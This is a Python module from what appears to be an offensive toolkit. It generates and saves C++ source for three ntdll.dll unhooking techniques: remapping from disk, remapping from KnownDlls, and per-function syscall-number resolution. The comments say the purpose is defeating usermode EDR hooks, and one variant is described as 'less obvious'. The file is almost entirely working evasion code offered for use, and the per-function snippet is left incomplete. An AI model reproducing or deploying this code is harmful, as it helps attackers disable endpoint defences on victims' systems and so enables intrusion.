# language: Python, file: Program/evade/unhook.py, target: Red Sky evade — unhook
# Generate NTDLL unhook code — remap the .text section from a clean copy of
# ntdll.dll sourced from disk or KnownDlls, defeating usermode EDR hooks.

import sys
from pathlib import Path
from typing import List

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import load_config, print_ok, print_err, print_info, print_warn, print_kv, print_bullet
from Program.utils.paths import OUTPUT_DIR


CPP_DISK = r'''// language: C++, target: NTDLL unhook by remapping from disk
// Reads a fresh copy of ntdll.dll from C:\Windows\System32 and copies the
// executable sections over the hooked in-memory version.

#include <windows.h>

static bool UnhookFromDisk() {
    HANDLE f = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll", GENERIC_READ,
                           FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
    if (f == INVALID_HANDLE_VALUE) return false;

    HANDLE map = CreateFileMappingW(f, nullptr, PAGE_READONLY | SEC_IMAGE, 0, 0, nullptr);
    if (!map) { CloseHandle(f); return false; }

    void* clean = MapViewOfFile(map, FILE_MAP_READ, 0, 0, 0);
    if (!clean) { CloseHandle(map); CloseHandle(f); return false; }

    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)clean;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)clean + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);

    HMODULE live = GetModuleHandleA("ntdll.dll");
    BYTE* base = (BYTE*)live;

    DWORD old;
    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
        if (sec->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            VirtualProtect(base + sec->VirtualAddress, sec->Misc.VirtualSize,
                           PAGE_EXECUTE_READWRITE, &old);
            memcpy(base + sec->VirtualAddress,
                   (BYTE*)clean + sec->VirtualAddress,
                   sec->Misc.VirtualSize);
            VirtualProtect(base + sec->VirtualAddress, sec->Misc.VirtualSize, old, &old);
        }
    }

    UnmapViewOfFile(clean);
    CloseHandle(map);
    CloseHandle(f);
    return true;
}
'''


CPP_KNOWNDLL = r'''// language: C++, target: NTDLL unhook from KnownDlls section
// Uses the \\KnownDlls\\ntdll.dll section object — always a clean copy,
// can't be tampered with by usermode. Defeats all usermode hooks.

#include <windows.h>
#include <winternl.h>

static bool UnhookFromKnownDlls() {
    UNICODE_STRING name;
    OBJECT_ATTRIBUTES attr;
    HANDLE section = nullptr;

    RtlInitUnicodeString(&name, L"\\KnownDlls\\ntdll.dll");
    InitializeObjectAttributes(&attr, &name, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

    NTSTATUS st = NtOpenSection(&section, SECTION_MAP_READ, &attr);
    if (st != 0) return false;

    void* clean = nullptr;
    SIZE_T size = 0;
    NtMapViewOfSection(section, GetCurrentProcess(), &clean, 0, 0, nullptr, &size,
                       ViewShare, 0, PAGE_READONLY);

    if (!clean) { CloseHandle(section); return false; }

    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)clean;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)clean + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);

    HMODULE live = GetModuleHandleA("ntdll.dll");
    BYTE* base = (BYTE*)live;

    DWORD old;
    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
        if (sec->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            VirtualProtect(base + sec->VirtualAddress, sec->Misc.VirtualSize,
                           PAGE_EXECUTE_READWRITE, &old);
            memcpy(base + sec->VirtualAddress,
                   (BYTE*)clean + sec->VirtualAddress,
                   sec->Misc.VirtualSize);
            VirtualProtect(base + sec->VirtualAddress, sec->Misc.VirtualSize, old, &old);
        }
    }

    NtUnmapViewOfSection(GetCurrentProcess(), clean);
    CloseHandle(section);
    return true;
}
'''


PER_SECTION = r'''// language: C++, target: per-function unhook via fresh syscall stubs
// Instead of remapping all of ntdll, rebuild individual NT function stubs
// from a clean source — less obvious, per-function granularity.

#include <windows.h>
#include <winternl.h>

// must be declared — ntdll exports
extern "C" NTSTATUS NtOpenSection(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);

struct Stub { DWORD ssn; void* gadget; };

static Stub FindStub(const char* funcName, void* cleanBase, void* gadget) {
    HMODULE live = GetModuleHandleA("ntdll.dll");
    // resolve the SSN by parsing the clean ntdll's export table
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)cleanBase;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)cleanBase + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)cleanBase +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* names = (DWORD*)((BYTE*)cleanBase + exp->AddressOfNames);
    DWORD* funcs = (DWORD*)((BYTE*)cleanBase + exp->AddressOfFunctions);
    WORD*  ords  = (WORD*)((BYTE*)cleanBase + exp->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        const char* n = (const char*)((BYTE*)cleanBase + names[i]);
        if (strcmp(n, funcName) != 0) continue;
        BYTE* stub = (BYTE*)cleanBase + funcs[ords[i]];
        for (int j = 0; j < 32; ++j) {
            if (stub[j] == 0xB8) {
                DWORD ssn = *(DWORD*)(stub + j + 1);
                if (ssn < 0x2000) return { ssn, gadget };
            }
        }
    }
    return { 0, nullptr };
}
'''


TECHNIQUES = {
    "disk":     ("remap from disk", CPP_DISK),
    "knowndll": ("remap from KnownDlls", CPP_KNOWNDLL),
    "per-fn":   ("per-function unhook", PER_SECTION),
}


def cmd_list() -> int:
    print_info(f"{len(TECHNIQUES)} unhook techniques")
    print()
    for key, (name, _) in TECHNIQUES.items():
        print(f"  {ARTERY}▓{RESET} {BONE}{key:<12}{RESET} {name}")
    return 0


def cmd_gen(technique: str, out_file: str = "") -> int:
    if technique not in TECHNIQUES:
        print_err(f"unknown technique: {technique}")
        print_info(f"available: {', '.join(TECHNIQUES.keys())}")
        return 2

    name, code = TECHNIQUES[technique]
    print_info(name)
    print()
    print(code)

    out = Path(out_file) if out_file else OUTPUT_DIR / "evade" / f"unhook_{technique}.cpp"
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(code)
    print()
    print_kv("saved", out)
    return 0


def run_cli(args: List[str]) -> int:
    if not args or args[0] == "list":
        return cmd_list()
    return cmd_gen(args[0], args[1] if len(args) > 1 else "")


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
